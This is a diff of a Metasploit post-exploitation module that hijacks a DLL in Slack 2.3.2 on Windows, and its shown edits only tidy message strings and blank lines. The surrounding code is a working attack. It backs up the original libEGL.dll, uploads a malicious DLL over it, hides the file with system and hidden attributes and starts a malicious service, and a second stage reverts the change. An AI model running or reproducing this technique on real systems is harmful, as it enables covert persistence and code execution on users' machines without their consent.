@@ -134,8 +134,6 @@ class MetasploitModule < Msf::Post
 
 
 
-
-
 # --------------------------------------------
 # UPLOAD OUR MALICIOUS DLL INTO TARGET SYSYTEM
 # --------------------------------------------
@@ -160,7 +158,7 @@ def ls_stage1
 
     # check if original libEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
-      print_warning(" Vulnerable dll agent: #{p_name} found...")
+      print_warning("Vulnerable dll agent: #{p_name} found...")
       # backup original dll using cmd.exe COPY command...
       print_good(" Backup original slack software dll...")
       r = session.sys.process.execute("cmd.exe /c COPY /Y #{d_path}\\#{p_name} #{d_path}\\libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
@@ -170,13 +168,13 @@ def ls_stage1
       print_good(" Uploading: #{p_name} malicious agent...")
       client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
       sleep(1.0)
-      print_good(" Uploaded : #{u_path} -> #{d_path}\\#{p_name}")
+      print_good(" Uploaded : #{d_path}\\#{p_name}")
       sleep(1.0)
 
         # change attributes of libEGL.dll to hidde it from site...
-        print_good(" Use attrib command to hidde dll...")
+        print_good(" Use attrib command to hidde malicious dll...")
         r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
-        print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
+        print_good(" attrib +h +s #{d_path}\\#{p_name}")
         sleep(1.0)
 
           # start remote malicious service
@@ -195,7 +193,7 @@ def ls_stage1
 
     else
       print_error("[ ABORT ]: post-module cant find original dll...")
-      print_error("slack_ dll: #{d_path}\\#{p_name}")
+      print_error("slack_dll: #{d_path}\\#{p_name}")
       print_line("")
     end
 
@@ -203,8 +201,6 @@ def ls_stage1
   rescue ::Exception => e
   print_error("Error: #{e.class} #{e}")
 end
-
-
 
 
 
@@ -243,7 +239,7 @@ def ls_stage2
       r = session.sys.process.execute("cmd.exe /c MOVE /Y #{d_path}\\#{b_name} #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.0)
       print_status("dll hijacking in slack 2.3.2 reverted...")
-      print_warning("we have lost our shell,but feeded the white hacker within... ")
+      print_warning("we have lost our shell, but feeded the white hacker within...")
       print_line("")
 
     # close channel when done
@@ -298,7 +294,7 @@ def run
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
-      print_error("ABORT]:This post-module only works in meterpreter sessions")
+      print_error("[ ABORT ]:This post-module only works in meterpreter sessions")
       raise Rex::Script::Completed
     end
     # elevate session privileges befor runing options
